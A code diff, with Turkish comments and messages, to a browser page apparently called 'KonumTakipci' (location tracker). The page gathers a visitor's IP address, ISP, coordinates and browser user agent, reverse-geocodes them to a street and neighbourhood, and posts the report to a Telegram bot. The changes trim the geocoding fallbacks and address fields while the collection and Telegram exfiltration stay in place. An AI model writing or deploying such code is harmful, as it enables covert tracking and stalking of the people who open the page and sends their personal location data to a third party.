@@ -188,89 +188,23 @@
       try {
         logToTerminal(`[${getCurrentTime()}] Detaylı adres bilgisi alınıyor...`);
         
-        // OpenStreetMap Nominatim API kullanıyoruz
-        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1&accept-language=tr`;
+        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`;
         const response = await fetch(url, {
-          headers: { 
-            'User-Agent': 'KonumTakipci/1.0',
-            'Accept': 'application/json'
-          }
+          headers: { 'User-Agent': 'KonumTakipci/1.0' }
         });
-        
-        if (!response.ok) {
-          throw new Error(`HTTP ${response.status}`);
-        }
-        
         const data = await response.json();
-        
-        if (!data || !data.address) {
-          throw new Error('Adres bilgisi alınamadı');
-        }
 
-        const addr = data.address;
-        
-        // Türkiye için daha uygun alan adları
-        const street = addr.road || addr.pedestrian || addr.path || addr.footway || 
-                      addr.cycleway || addr.street || '';
-        
-        const neighborhood = addr.suburb || addr.neighbourhood || addr.quarter || 
-                           addr.residential || addr.city_district || addr.district || '';
-        
-        const city = addr.city || addr.town || addr.municipality || addr.village || 
-                    addr.hamlet || '';
-        
-        const region = addr.state || addr.province || addr.region || '';
-        const country = addr.country || '';
-        
-        // Posta kodu bilgisi
-        const postal = addr.postcode || '';
-        
-        logToTerminal(`[${getCurrentTime()}] ✅ Adres bilgisi başarıyla alındı`);
-        
+        const addr = data.address || {};
         return {
-          street: street,
-          neighborhood: neighborhood,
-          city: city,
-          region: region,
-          country: country,
-          postal: postal,
-          fullAddress: data.display_name || ''
+          street: addr.road || '',
+          neighborhood: addr.suburb || addr.neighbourhood || '',
+          city: addr.city || addr.town || addr.village || '',
+          region: addr.state || '',
+          country: addr.country || ''
         };
       } catch (error) {
         logToTerminal(`[${getCurrentTime()}] Reverse geocoding hatası: ${error.message}`);
-        
-        // Alternatif API denemesi
-        try {
-          logToTerminal(`[${getCurrentTime()}] Alternatif API deneniyor...`);
-          
-          const altUrl = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=tr`;
-          const altResponse = await fetch(altUrl);
-          const altData = await altResponse.json();
-          
-          if (altData) {
-            return {
-              street: altData.locality || '',
-              neighborhood: altData.principalSubdivision || '',
-              city: altData.city || '',
-              region: altData.principalSubdivision || '',
-              country: altData.countryName || '',
-              postal: altData.postcode || '',
-              fullAddress: altData.locality || ''
-            };
-          }
-        } catch (altError) {
-          logToTerminal(`[${getCurrentTime()}] Alternatif API de başarısız: ${altError.message}`);
-        }
-        
-        return { 
-          street: 'Tespit edilemedi', 
-          neighborhood: 'Tespit edilemedi', 
-          city: '', 
-          region: '', 
-          country: '',
-          postal: '',
-          fullAddress: ''
-        };
+        return { street: '', neighborhood: '', city: '', region: '', country: '' };
       }
     }
 
@@ -288,8 +222,6 @@
             parse_mode: 'HTML'
           })
         });
-        
-        logToTerminal(`[${getCurrentTime()}] 📱 Telegram mesajı gönderildi`);
       } catch (error) {
         logToTerminal(`[${getCurrentTime()}] Telegram API hatası: ${error.message}`);
       }
@@ -300,18 +232,13 @@
       logToTerminal(`[${getCurrentTime()}] 📡 Veriler toplanıyor...`);
 
       let locationData = await getLocationData();
-      
-      // Reverse geocoding ile detaylı adres bilgisi al
+
       const reverseData = await reverseGeocode(locationData.latitude, locationData.longitude);
-      
-      // Mevcut verileri güncelle (boş olanları override et)
-      locationData.street = reverseData.street || locationData.street || 'Tespit edilemedi';
-      locationData.neighborhood = reverseData.neighborhood || locationData.neighborhood || 'Tespit edilemedi';
+      locationData.street = reverseData.street || locationData.street;
+      locationData.neighborhood = reverseData.neighborhood || locationData.neighborhood;
       locationData.city = reverseData.city || locationData.city;
       locationData.region = reverseData.region || locationData.region;
       locationData.country = reverseData.country || locationData.country;
-      locationData.postal = reverseData.postal || locationData.postal;
-      locationData.fullAddress = reverseData.fullAddress || '';
 
       const coordsFormatted = formatCoordinate(locationData.latitude, locationData.longitude);
 
@@ -320,13 +247,12 @@
         `📍 IP: ${locationData.ip}\n` +
         `🏙️ Şehir: ${locationData.city}\n` +
         `🗺️ Bölge: ${locationData.region}\n` +
-        `🏘️ Mahalle: ${locationData.neighborhood}\n` +
-        `🛣️ Sokak: ${locationData.street}\n` +
+        `🏘️ Mahalle: ${locationData.neighborhood || 'Bilinmiyor'}\n` +
+        `🛣️ Sokak: ${locationData.street || 'Bilinmiyor'}\n` +
         `📮 Posta Kodu: ${locationData.postal}\n` +
         `🌐 Ülke: ${locationData.country}\n` +
         `🏢 ISP: ${locationData.org}\n` +
-        `📐 Koordinatlar: ${coordsFormatted}\n` +
-        `📍 Tam Adres: ${locationData.fullAddress}\n\n` +
+        `📐 Koordinatlar: ${coordsFormatted}\n\n` +
 
         `💻 TARAYICI BİLGİLERİ:\n` +
         `🔍 User Agent: ${navigator.userAgent}\n` +
@@ -370,12 +296,10 @@
             <b>📍 Konumunuz</b><br><br>
             <b>🏙️ Şehir:</b> ${locationData.city}<br>
             <b>🗺️ Bölge:</b> ${locationData.region}<br>
-            <b>🏘️ Mahalle:</b> ${locationData.neighborhood}<br>
-            <b>🛣️ Sokak:</b> ${locationData.street}<br>
-            <b>📮 Posta Kodu:</b> ${locationData.postal}<br>
+            <b>🏘️ Mahalle:</b> ${locationData.neighborhood || 'Bilinmiyor'}<br>
+            <b>🛣️ Sokak:</b> ${locationData.street || 'Bilinmiyor'}<br>
             <b>🌐 Ülke:</b> ${locationData.country}<br>
-            <b>📐 Koordinatlar:</b> ${formatCoordinate(lat, lon)}<br>
-            ${locationData.fullAddress ? `<b>📍 Tam Adres:</b> ${locationData.fullAddress}` : ''}
+            <b>📐 Koordinatlar:</b> ${formatCoordinate(lat, lon)}
           </div>`;
 
         L.marker([lat, lon])
